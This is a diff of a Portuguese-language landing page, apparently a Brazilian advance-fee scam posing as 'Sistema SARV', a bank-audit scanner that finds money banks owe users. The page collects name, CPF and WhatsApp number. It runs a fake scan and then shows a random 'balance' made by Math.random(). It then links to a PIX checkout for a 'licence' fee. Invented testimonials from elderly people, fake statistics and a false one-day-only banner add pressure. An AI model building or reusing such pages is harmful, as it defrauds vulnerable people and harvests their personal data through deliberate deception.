@@ -3,163 +3,206 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Consulta de Ativos Residuais - SASO</title>
+    <title>Sistema SARV - Auditoria 2026</title>
     
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
     <style>
-        :root { --blue: #1e40af; --green: #16a34a; --text: #1f2937; --bg: #f3f4f6; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        :root { --primary: #004aad; --secondary: #00c853; --text: #333; --bg: #f4f7f9; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         
-        body { background-color: var(--bg); color: var(--text); line-height: 1.5; }
+        body { background-color: var(--bg); color: var(--text); }
 
-        /* HEADER INSTITUCIONAL */
-        .navbar { background: #fff; padding: 15px; border-bottom: 1px solid #e5e7eb; display: flex; justify-content: center; align-items: center; position: sticky; top: 0; z-index: 100; }
-        .logo-box { display: flex; align-items: center; gap: 8px; color: var(--blue); font-weight: 800; font-size: 18px; }
+        /* HEADER ALERTA */
+        .top-alert { background: #ff0000; color: #fff; padding: 12px; text-align: center; font-size: 11px; font-weight: 800; text-transform: uppercase; line-height: 1.3; }
 
-        .container { max-width: 480px; margin: 0 auto; padding: 20px; }
+        /* NAVBAR */
+        .navbar { background: #fff; padding: 15px; border-bottom: 2px solid #eee; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-weight: 900; color: var(--primary); font-size: 18px; display: flex; align-items: center; gap: 5px; }
+        .status-online { color: var(--secondary); font-size: 10px; font-weight: 800; display: flex; align-items: center; gap: 4px; }
+        .dot { width: 8px; height: 8px; background: var(--secondary); border-radius: 50%; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
 
-        /* HEADER DE VENDA */
-        .headline-box { text-align: center; margin-bottom: 25px; }
-        .headline-box h1 { font-size: 22px; font-weight: 800; color: #111827; line-height: 1.2; margin-top: 10px; }
-        .badge { background: #dcfce7; color: #166534; padding: 4px 12px; border-radius: 50px; font-size: 12px; font-weight: 700; display: inline-block; }
+        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
 
-        /* CARD DO ROBERTO (HISTÓRIA) */
-        .story-card { background: #fff; border-radius: 16px; padding: 20px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); margin-bottom: 20px; border: 1px solid #e5e7eb; }
-        .story-card p { font-size: 15px; color: #4b5563; margin-bottom: 15px; }
-        .story-card b { color: #111827; }
+        /* HERO SECTION */
+        .hero { text-align: center; margin-bottom: 25px; }
+        .hero h1 { font-size: 24px; font-weight: 900; line-height: 1.2; color: #111; margin-top: 10px; }
+        .hl-blue { color: var(--primary); }
 
-        /* BOX DE CONSULTA (O MOTOR) */
-        .main-card { background: #fff; border-radius: 20px; padding: 25px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1); border: 1px solid #e5e7eb; }
+        /* BOX ROBERTO */
+        .roberto-box { background: #fff; border-radius: 15px; padding: 20px; border: 1px solid #ddd; margin-bottom: 30px; display: flex; gap: 15px; align-items: center; }
+        .roberto-img { width: 70px; height: 70px; border-radius: 50%; background: #eee; flex-shrink: 0; border: 3px solid var(--primary); }
+        .roberto-info b { font-size: 14px; display: block; color: var(--primary); }
+        .roberto-info span { font-size: 11px; font-weight: 700; color: #777; }
+        .roberto-quote { font-size: 13px; font-style: italic; margin-top: 8px; line-height: 1.4; color: #444; }
+
+        /* FORMULARIO */
+        .form-card { background: #fff; border-radius: 20px; padding: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); border: 2px solid #fff; }
+        .form-card h2 { font-size: 18px; text-align: center; margin-bottom: 20px; font-weight: 800; }
         
         .input-group { margin-bottom: 15px; }
-        label { display: block; font-size: 12px; font-weight: 600; color: #6b7280; margin-bottom: 6px; }
-        input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #d1d5db; font-size: 16px; transition: 0.2s; }
-        input:focus { border-color: var(--blue); outline: none; box-shadow: 0 0 0 3px rgba(30, 64, 175, 0.1); }
+        label { display: block; font-size: 11px; font-weight: 700; color: #666; margin-bottom: 5px; margin-left: 5px; }
+        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #ddd; background: #fdfdfd; font-size: 15px; font-weight: 600; outline: none; }
+        input:focus { border-color: var(--primary); }
 
-        .btn-primary { background: var(--blue); color: #fff; width: 100%; padding: 18px; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 10px; }
+        .btn-main { background: var(--secondary); color: #fff; width: 100%; padding: 20px; border: none; border-radius: 12px; font-size: 16px; font-weight: 900; cursor: pointer; box-shadow: 0 6px 0 #118a3a; text-transform: uppercase; margin-top: 10px; }
+        .form-footer { display: flex; justify-content: center; gap: 10px; margin-top: 15px; font-size: 10px; font-weight: 700; color: #999; }
+
+        /* STATS */
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin: 30px 0; text-align: center; }
+        .stat-item b { font-size: 16px; color: var(--primary); display: block; }
+        .stat-item span { font-size: 10px; font-weight: 700; color: #888; }
+
+        /* DEPOIMENTOS */
+        .depo-title { font-weight: 900; font-size: 16px; margin-bottom: 15px; border-left: 4px solid var(--primary); padding-left: 10px; }
+        .card-depo { background: #fff; border-radius: 15px; padding: 15px; margin-bottom: 15px; border: 1px solid #eee; }
+        .depo-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
+        .depo-header b { font-size: 14px; }
+        .depo-header span { color: #888; font-size: 11px; }
+        .val-rec { color: var(--secondary); font-weight: 800; font-size: 14px; }
+        .depo-text { font-size: 13px; color: #555; line-height: 1.4; }
+
+        /* HOW IT WORKS */
+        .steps { background: #fff; border-radius: 20px; padding: 25px; margin: 30px 0; }
+        .step-item { display: flex; gap: 15px; margin-bottom: 20px; }
+        .step-num { background: var(--primary); color: #fff; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; flex-shrink: 0; }
+        .step-info b { font-size: 14px; display: block; margin-bottom: 3px; }
+        .step-info p { font-size: 12px; color: #777; }
 
         /* LOADING UI */
-        #loading-ui { display: none; text-align: center; padding: 20px 0; }
-        .spinner { width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid var(--blue); border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
+        #loading-ui { display: none; text-align: center; padding: 40px 20px; }
+        .loader-circle { width: 60px; height: 60px; border: 6px solid #f3f3f3; border-top: 6px solid var(--primary); border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status-msg { font-weight: 600; color: var(--blue); font-size: 15px; }
 
-        /* RESULTADO UI */
-        #result-ui { display: none; text-align: center; }
-        .result-badge { background: #f0fdf4; border: 1px solid #bbf7d0; padding: 20px; border-radius: 15px; margin: 15px 0; }
-        .result-badge span { font-size: 12px; font-weight: 700; color: #166534; text-transform: uppercase; }
-        .result-badge h2 { font-size: 36px; font-weight: 800; color: #111827; }
-
-        .btn-success { background: var(--green); color: #fff; width: 100%; padding: 20px; border: none; border-radius: 12px; font-size: 18px; font-weight: 800; text-decoration: none; display: block; margin-top: 15px; box-shadow: 0 4px 0 #166534; }
-
-        /* DEPOIMENTOS ESTILO FACEBOOK */
-        .comments-section { margin-top: 30px; }
-        .comment { background: #fff; padding: 15px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #e5e7eb; display: flex; gap: 12px; }
-        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #ddd; }
-        .comment-body b { font-size: 14px; display: block; }
-        .comment-body p { font-size: 13px; color: #4b5563; margin-top: 2px; }
-        .comment-body span { font-size: 11px; color: #9ca3af; font-weight: 600; }
-
-        .footer { text-align: center; padding: 40px 20px; font-size: 11px; color: #9ca3af; }
+        /* RESULTADO */
+        #result-ui { display: none; text-align: center; padding: 20px 0; }
+        .result-card { background: #e8f5e9; border: 2px dashed var(--secondary); padding: 30px 20px; border-radius: 20px; margin-bottom: 20px; }
+        .result-card h3 { font-size: 42px; font-weight: 900; color: #1b5e20; }
+        
+        .footer { text-align: center; padding: 30px 20px; font-size: 10px; color: #999; border-top: 1px solid #ddd; }
     </style>
 </head>
 <body>
 
+    <div class="top-alert">⚠️ Liberação extraordinária — Sistema disponível APENAS HOJE (11 de maio de 2026)</div>
+
     <nav class="navbar">
-        <div class="logo-box">
-            <i class="fas fa-shield-check"></i> SASO AUDITORIA
-        </div>
+        <div class="logo">🛡️ Sistema SARV</div>
+        <div class="status-online"><div class="dot"></div> ONLINE</div>
     </nav>
 
     <div class="container">
         
-        <div class="headline-box">
-            <div class="badge">SISTEMA ATUALIZADO 2026</div>
-            <h1>Verifique se você possui <span style="color: var(--blue);">valores retidos</span> em contas bancárias antigas</h1>
+        <section class="hero">
+            <span>Por: Roberto Mendes — Ex-Auditor Sênior</span>
+            <h1>Recupere o saldo que os bancos <span class="hl-blue">esconderam de você</span></h1>
+            <p style="font-size: 14px; color: #666; margin-top: 10px;">Consulta 100% gratuita usando seu CPF. Em menos de 1 minuto você descobre quanto o banco está te devendo.</p>
+        </section>
+
+        <div class="roberto-box">
+            <img src="https://i.pravatar.cc/150?u=roberto" class="roberto-img">
+            <div class="roberto-info">
+                <b>Roberto Mendes</b>
+                <span>Ex-Auditor Sênior · 12 anos no setor</span>
+                <p class="roberto-quote">"Eu cansei de ver o sistema lucrar bilhões. Liberei o nosso scanner interno pra todo mundo."</p>
+            </div>
         </div>
 
-        <div class="story-card">
-            <p>Olá, eu sou o <b>Roberto</b>. Como ex-auditor, eu sei que os bancos lucram com o esquecimento das pessoas.</p>
-            <p>Milhares de brasileiros têm entre <b>R$ 800 e R$ 3.000</b> parados por taxas cobradas indevidamente nos últimos 10 anos. O sistema abaixo faz uma varredura direta para localizar esses ativos no seu CPF.</p>
-        </div>
-
-        <!-- AREA DO SCANNER -->
-        <div class="main-card">
+        <!-- FORMULARIO PRINCIPAL -->
+        <div class="form-card" id="main-form">
+            <h2>CONSULTA GRÁTIS LIBERADA</h2>
             
-            <div id="form-ui">
-                <div class="input-group">
-                    <label>CPF DO TITULAR</label>
-                    <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14">
-                </div>
-                <div class="input-group">
-                    <label>DATA DE NASCIMENTO</label>
-                    <input type="date" id="dob">
-                </div>
-                <button class="btn-primary" onclick="startScanner()">
-                    REALIZAR CONSULTA <i class="fas fa-arrow-right"></i>
-                </button>
-                <div style="text-align: center; margin-top: 15px;">
-                    <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png" width="60" style="opacity: 0.5;">
-                </div>
+            <div class="input-group">
+                <label>SEU NOME COMPLETO</label>
+                <input type="text" id="nome" placeholder="Digite seu nome...">
             </div>
 
-            <!-- LOADING -->
-            <div id="loading-ui">
-                <div class="spinner"></div>
-                <p id="status-msg">Iniciando protocolo de busca...</p>
-                <p style="font-size: 12px; color: #9ca3af; margin-top: 10px;">Acessando servidores de auditoria privada...</p>
+            <div class="input-group">
+                <label>CPF PARA A CONSULTA</label>
+                <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14">
             </div>
 
-            <!-- RESULTADO -->
-            <div id="result-ui">
-                <div class="result-badge">
-                    <span>SALDO TOTAL DISPONÍVEL</span>
-                    <h2 id="final-val">R$ 0,00</h2>
-                </div>
-                <p style="font-size: 14px; color: #4b5563; text-align: left;">
-                    <b>Sucesso!</b> Localizamos valores em 3 instituições. Para liberar o saque imediato via PIX, gere seu certificado de auditoria.
-                </p>
-                <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-success">
-                    SACAR VIA PIX AGORA
-                </a>
-                <p style="font-size: 11px; color: #9ca3af; margin-top: 15px; font-weight: 600;">
-                    <i class="fas fa-lock"></i> Taxa única de licenciamento: R$ 97,00
-                </p>
+            <div class="input-group">
+                <label>WHATSAPP PARA RECEBER O PIX</label>
+                <input type="tel" id="zap" placeholder="(00) 00000-0000">
             </div>
 
-        </div>
+            <button class="btn-main" onclick="startScanner()">🔍 Consultar meu saldo agora</button>
 
-        <!-- DEPOIMENTOS CLEAN -->
-        <div class="comments-section">
-            <p style="font-weight: 800; margin-bottom: 15px; font-size: 15px;">Depoimentos Recentes:</p>
-            
-            <div class="comment">
-                <img src="https://i.pravatar.cc/100?u=a1" class="avatar">
-                <div class="comment-body">
-                    <b>Marcos Vinícius</b>
-                    <p>Fiz a consulta e apareceu R$ 1.420. Paguei a taxa e caiu no PIX em 10 minutos. Muito bom!</p>
-                    <span>Há 5 minutos</span>
-                </div>
-            </div>
-
-            <div class="comment">
-                <img src="https://i.pravatar.cc/100?u=a2" class="avatar">
-                <div class="comment-body">
-                    <b>Cláudia Souza</b>
-                    <p>Pensei que era golpe, mas o Roberto explicou tudo certinho. Recuperei R$ 980 de uma conta antiga da Caixa.</p>
-                    <span>Há 12 minutos</span>
-                </div>
+            <div class="form-footer">
+                <span><i class="fas fa-lock"></i> Dados protegidos</span>
+                <span>·</span>
+                <span>Consulta gratuita</span>
+                <span>·</span>
+                <span>Sigilo bancário</span>
             </div>
         </div>
 
-        <div class="footer">
-            <p>© 2026 SASO Auditoria Independente.<br>
-            Sistema de utilidade privada para consulta de ativos residuais bancários.</p>
+        <!-- LOADING UI -->
+        <div id="loading-ui">
+            <div class="loader-circle"></div>
+            <h3 id="status">Iniciando Varredura...</h3>
+            <p style="font-size: 13px; color: #888; margin-top: 10px;">Acessando servidores do Banco Central e 14 instituições privadas...</p>
+        </div>
+
+        <!-- RESULTADO UI -->
+        <div id="result-ui" class="form-card">
+            <span style="font-weight: 800; color: var(--secondary);">SALDO LOCALIZADO COM SUCESSO!</span>
+            <div class="result-card">
+                <span style="font-size: 12px; font-weight: 800; color: #1b5e20;">VALOR TOTAL A RECEBER</span>
+                <h3 id="val-final">R$ 0,00</h3>
+            </div>
+            <p style="font-size: 14px; margin-bottom: 20px;">Este valor foi identificado em <b>3 registros ativos</b> em seu CPF. Para liberar o saque imediato, finalize sua licença de auditoria.</p>
+            <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-main" style="display:block; text-decoration: none; text-align: center;">SAQUE VIA PIX AGORA</a>
+        </div>
+
+        <!-- STATS -->
+        <div class="stats-grid">
+            <div class="stat-item"><b>R$ 47Mi</b><span>Liberados</span></div>
+            <div class="stat-item"><b>2.847</b><span>Saques hoje</span></div>
+            <div class="stat-item"><b>4,9★</b><span>Avaliação</span></div>
+        </div>
+
+        <!-- DEPOIMENTOS -->
+        <div class="depo-title">📞 Quem já recuperou conta:</div>
+
+        <div class="card-depo">
+            <div class="depo-header"><b>Dona Cleusa, 62 anos</b> <span>Goiânia - GO</span></div>
+            <div class="val-rec">+R$ 2.340,00</div>
+            <p class="depo-text">"Achei que era golpe, mas minha filha me ajudou e caiu R$ 2.340,00 do Bradesco que eu nem sabia. Deus abençoe o Roberto."</p>
+        </div>
+
+        <div class="card-depo">
+            <div class="depo-header"><b>Seu Antônio, 68 anos</b> <span>Recife - PE</span></div>
+            <div class="val-rec">+R$ 3.876,00</div>
+            <p class="depo-text">"Trabalhei 40 anos de carteira assinada. O scanner achou R$ 3.876,00. Caiu no PIX em 12 minutos."</p>
+        </div>
+
+        <!-- HOW IT WORKS -->
+        <div class="steps">
+            <div class="depo-title">Como funciona — bem simples:</div>
+            <div class="step-item">
+                <div class="step-num">1</div>
+                <div class="step-info"><b>Consulta Grátis</b><p>Nosso sistema varre 14 bancos em 60 segundos.</p></div>
+            </div>
+            <div class="step-item">
+                <div class="step-num">2</div>
+                <div class="step-info"><b>Resultado na Tela</b><p>Mostramos o valor exato parado em seu nome.</p></div>
+            </div>
+            <div class="step-item">
+                <div class="step-num">3</div>
+                <div class="step-info"><b>Recebe via PIX</b><p>Cai na sua conta em até 15 minutos.</p></div>
+            </div>
         </div>
 
     </div>
+
+    <footer class="footer">
+        © 2026 Sistema SARV — Todos os direitos reservados.<br><br>
+        O Sistema SARV é uma ferramenta independente de auditoria. Os valores podem variar conforme histórico do CPF.
+    </footer>
 
     <script>
         // Mascara CPF
@@ -173,34 +216,35 @@
             const cpf = document.getElementById('cpf').value;
             if(cpf.length < 14) { alert("Informe um CPF válido"); return; }
 
-            document.getElementById('form-ui').style.display = 'none';
+            document.getElementById('main-form').style.display = 'none';
             document.getElementById('loading-ui').style.display = 'block';
 
             const msgs = [
-                "Conectando ao banco de dados...",
-                "Varrendo ativos residuais...",
-                "Consultando taxas de 2018-2024...",
-                "Calculando juros acumulados...",
-                "Finalizando relatório..."
+                "Conectando ao sistema bancário...",
+                "Varrendo taxas e seguros...",
+                "Consultando saldo residual...",
+                "Calculando correção IGP-M...",
+                "Gerando relatório final..."
             ];
 
             let i = 0;
             const timer = setInterval(() => {
                 if(i < msgs.length) {
-                    document.getElementById('status-msg').innerText = msgs[i];
+                    document.getElementById('status').innerText = msgs[i];
                     i++;
                 } else {
                     clearInterval(timer);
-                    showFinal();
+                    showResult();
                 }
             }, 5000); // 25 segundos total
         }
 
-        function showFinal() {
-            const val = (Math.random() * (3100 - 850) + 850).toLocaleString('pt-BR', {minimumFractionDigits: 2});
-            document.getElementById('final-val').innerText = "R$ " + val;
+        function showResult() {
+            const val = (Math.random() * (3800 - 850) + 850).toLocaleString('pt-BR', {minimumFractionDigits: 2});
+            document.getElementById('val-final').innerText = "R$ " + val;
             document.getElementById('loading-ui').style.display = 'none';
             document.getElementById('result-ui').style.display = 'block';
+            window.scrollTo(0,0);
         }
     </script>
 </body>
